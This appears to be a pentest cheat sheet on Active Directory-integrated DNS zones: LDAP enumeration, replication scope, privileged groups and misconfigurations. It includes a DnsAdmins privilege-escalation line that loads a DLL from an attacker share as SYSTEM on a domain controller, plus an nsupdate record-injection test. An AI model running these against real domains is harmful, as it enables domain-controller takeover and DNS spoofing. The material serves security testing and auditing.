---
aliases:
  - AD DNS Zones
  - DomainDnsZones
  - ForestDnsZones
  - MicrosoftDNS Partition
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - DNS & SRV Records]]"
---
# AD - DNS & SRV Records - AD-Integrated DNS Zones

***

## DNS Storage Architecture

| **Concepto** | **Path / Detalle** | **Notas** |
|:---:|:---:|:---:|
| AD-integrated zones | Stored as objects in AD | Replicated via AD repl. |
| `MicrosoftDNS` container | `CN=MicrosoftDNS,CN=System,DC=...` (legacy) | Old default. |
| DomainDnsZones partition | `DC=DomainDnsZones,DC=dom,DC=local` | Domain-wide replication. |
| ForestDnsZones partition | `DC=ForestDnsZones,DC=forest,DC=local` | Forest-wide replication. |
| Zone object class | `dnsZone` | Schema. |
| Record object class | `dnsNode` | Schema. |
| Replication scope | DomainDns / ForestDns / Legacy / Custom | Selectable. |
| Custom partitions | Application directory partition | Edge. |
| SOA record stored in zone object | Standard | Per-zone. |
| Zone replication frequency | Default 5min change notify | Standard. |
| Pre-Win 2003 compat | Legacy zones in `MicrosoftDNS` only | Backward. |
| File-based zones (non-AD) | Stored in `%SystemRoot%\System32\dns` | Edge. |
| Zone signing (DNSSEC) | Modern AD support | Edge. |
| Conditional forwarders | Per-zone forwarders | Edge. |
| Stub zones | Authority pointer | Adjacent. |
| Reverse zones | `0.10.in-addr.arpa` etc | PTR records. |
^ad-zones-architecture

### Discover replication partitions

```bash
# RootDSE shows partitions
ldapsearch -x -h DC -s base -b "" namingContexts

# Look for:
# DC=DomainDnsZones,DC=dom,DC=local
# DC=ForestDnsZones,DC=forest,DC=local
```

```powershell
# RSAT
Get-ADReplicationPartition -Filter * | Select Name,Type
```

___

## Zone Enumeration via LDAP

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `ldapsearch -b "DC=DomainDnsZones,DC=dom,DC=local" "(objectClass=dnsZone)"` | Domain zones | Linux. |
| `ldapsearch -b "DC=ForestDnsZones,DC=forest,DC=local" "(objectClass=dnsZone)"` | Forest zones | Linux. |
| `Get-DnsServerZone` (on DC) | All zones | RSAT/native. |
| `Get-DnsServerZone | Where ZoneType -eq "Primary"` | Primary zones | RSAT. |
| `dnscmd /enumzones` | Native Windows | Adjacent. |
| `dnscmd /zoneinfo <zone>` | Per-zone detail | Adjacent. |
| `Get-ADObject -SearchBase "DC=DomainDnsZones,..." -Filter "ObjectClass -eq 'dnsZone'"` | RSAT generic | Adjacent. |
| Replication scope per zone | DC=DomainDnsZones vs DC=ForestDnsZones | Position reveals. |
| Default zones | `<dom>`, `_msdcs.<dom>` | Always present. |
| Reverse lookup zones | `<subnet>.in-addr.arpa` | Often present. |
| Custom zones | Internal app DNS | Recon target. |
| TrustAnchors zone | DNSSEC trust anchors | Modern. |
| ConditionalForwarders zone | Forward-to entries | Adjacent. |
| Zone-level ACLs | DACL on zone object | Privesc path. |
| GenericAll on dnsZone | Could create/modify records | ACL abuse. |
| WriteProperty on dnsNode | Edit specific records | ACL abuse. |
^ad-zones-ldap-enum

### LDAP zone enum

```bash
# Domain zones
ldapsearch -h DC -D 'dom\user' -w pass \
  -b "DC=DomainDnsZones,DC=dom,DC=local" \
  -s onelevel \
  "(objectClass=dnsZone)" \
  dc distinguishedName

# Forest zones (forest root)
ldapsearch -h DC -D 'dom\user' -w pass \
  -b "DC=ForestDnsZones,DC=forest,DC=local" \
  -s onelevel \
  "(objectClass=dnsZone)" \
  dc distinguishedName
```

```powershell
# RSAT (need RSAT-DNS feature)
Get-DnsServerZone -ComputerName DC | 
  Select ZoneName,ZoneType,ReplicationScope,IsAutoCreated,DynamicUpdate
```

___

## Records Discovery (dnsNode Objects)

| **Comando** | **Output** | **Notas** |
|:---:|:---:|:---:|
| `ldapsearch -b "DC=<zone>,DC=DomainDnsZones,DC=dom,DC=local" "(objectClass=dnsNode)"` | All records in zone | Direct. |
| `Get-DnsServerResourceRecord -ZoneName <zone>` | RSAT all records | Standard. |
| `Get-DnsServerResourceRecord -ZoneName <zone> -RRType A` | Filtered A records | Type filter. |
| `dnscmd /enumrecords <zone> @` | Native | Adjacent. |
| Record types | A, AAAA, CNAME, MX, SRV, TXT, PTR, NS | Standard. |
| `dnsRecord` attribute | Binary blob with parsed record data | LDAP-stored. |
| Decoder needed for blob | Use adidnsdump or PowerShell native | Tooling. |
| Tombstoned records | Not deleted, marked | Replication. |
| Static vs dynamic | DDNS vs manual | Source. |
| TimeStamp 0 = static | Doesn't expire | Edge. |
| TimeStamp != 0 = dynamic | Subject to scavenging | Standard. |
| Aged records auto-purge | Scavenging configured | Standard. |
| GENERATE/wildcard records | Edge | Wildcard. |
| Multi-master DNS | All DCs writable | Replication. |
| Overlapping records | Conflict resolution by timestamp | Edge. |
| Audit LDAP queries on `dnsNode` | Detection signal | Defender. |
^ad-zones-records

### Record enumeration

```powershell
# All records in primary zone
Get-DnsServerResourceRecord -ZoneName "dom.local" -ComputerName DC |
  Select RecordType,HostName,RecordData,Timestamp |
  Sort RecordType,HostName

# Adidnsdump (Linux-friendly, parses dnsRecord blobs)
pip install adidnsdump
adidnsdump -u 'dom\user' --password 'pass' DC --zone "dom.local" -r
```

___

## Replication Scope Implications

| **Scope** | **Replicated to** | **Notas** |
|:---:|:---:|:---:|
| `DomainDnsZones` | All DCs in domain | Domain-wide. |
| `ForestDnsZones` | All DCs in forest | Forest-wide. |
| `Domain` (legacy) | All DCs in domain | Pre-Win 2003. |
| Custom partition | Specified DCs only | Custom. |
| File-based (not AD) | Per-server | Not replicated. |
| `_msdcs` always Forest | Built-in | Standard. |
| Default zone replication | DomainDnsZones | Standard. |
| Cross-domain access | ForestDnsZones requires GC | Standard. |
| Replication delay | 5-15 min typical | Standard. |
| Convergence time | Site-link dependent | Topology. |
| Read-only replicas (RODC DNS) | Filtered | Edge. |
| Replica add/remove | `dnscmd /createdirectorypartition` | Adjacent. |
| Anonymous queries vs authenticated | Per-zone setting | Adjacent. |
| Secure dynamic update | Auth required for DDNS | Defense. |
| Insecure dynamic update | Anyone can update | Critical vuln. |
| `DnsAdmins` group | Manage DNS service (RCE legacy) | Privesc combo. |
^ad-zones-replication

### DnsAdmins privesc (legacy combo)

```powershell
# DnsAdmins members can register DLLs as DNS plugins → RCE on DC (LEGACY pre-2017 patch)
# CVE-2017-7299 patched but check legacy environments
Get-ADGroupMember "DnsAdmins"

# If user is member:
# dnscmd <DC> /config /serverlevelplugindll \\attacker\share\evil.dll
# Reload DNS service → DLL loaded as SYSTEM
```

___

## DNS-related Privileged Groups

| **Group** | **Default Members** | **Notas** |
|:---:|:---:|:---:|
| DnsAdmins | None default | Manage DNS service — RCE legacy. |
| DnsUpdateProxy | DHCP servers typically | Excluded from auth on DDNS. |
| Domain Admins | Implicit DNS admin | Top tier. |
| Enterprise Admins | Forest DNS admin | Forest tier. |
| `Pre-Windows 2000 Compatible Access` | Edge — anonymous DDNS | Legacy. |
| Server Operators | Limited DNS service control | Edge. |
| Local System (DC) | Implicit | Standard. |
| `dnsRecord` write per-record | ACL-delegated | Granular. |
| Zone-level GenericAll | Modify all records | Privesc. |
| Zone-level WriteOwner | Take ownership | 2-step. |
| Zone-level Create child object | Add records (DNS spoof) | Critical. |
| Per-record ACL | Modify specific record | Granular. |
| `*` / `wildcard` records ownership | Spoof anything | Critical. |
| WPAD record write | WPAD attack | Specific abuse. |
| External-facing zone write | Public DNS poisoning | Edge. |
| Reverse zone write | PTR spoofing | Edge. |
^ad-zones-groups

### DnsAdmins audit

```powershell
# Check membership
Get-ADGroupMember "DnsAdmins" | Select Name,SamAccountName

# Recursive
Get-ADGroupMember "DnsAdmins" -Recursive

# Empty by default — any member is suspicious
```

___

## DNS-Specific Misconfigs

| **Misconfig** | **Impacto** | **Notas** |
|:---:|:---:|:---:|
| Anonymous AXFR enabled | Full zone enum sin auth | Critical leak. |
| Insecure DDNS update | Atacante crea/modifica records | Spoof attacks. |
| `DnsAdmins` populated with non-admins | RCE via DLL plugin | Legacy pre-patch. |
| Wildcard records | Catch-all responses | Edge abuse. |
| External resolver = internal DNS | Internal records leaked publicly | Critical. |
| Old zones not cleaned up | Stale records | Maintenance gap. |
| `*.<dom>` record | Wildcard responds anything | Edge. |
| `WPAD` record exists | WPAD attack viable | Combo. |
| `mitm6 IPv6 DHCPv6` + DDNS | Spoof DNS records dynamically | Combo. |
| Conditional forwarders to attacker DNS | Forwarding control | Persist. |
| Trust anchor poisoning | DNSSEC bypass | Edge. |
| Zone-level ACL on creation | Default Authenticated Users CreateChild | Risk. |
| External-public AD DNS exposure | Internal info leak | Audit. |
| AD-integrated zone on perimeter DC | Bridging zone | Edge. |
| Stale DC records | False targets | Audit. |
| `_kerberos` poisoned to non-DC | Auth interception | Critical. |
^ad-zones-misconfig

### Test misconfigs

```bash
# AXFR test
dig AXFR dom.local @DC
dig AXFR _msdcs.dom.local @DC

# WPAD record check
dig +short A wpad.dom.local

# Wildcard test
dig +short A nonexistent12345.dom.local

# Insecure DDNS test (ofensiva — care)
nsupdate <<EOF
server DC
update add test.dom.local 60 A 1.2.3.4
send
EOF
```

***
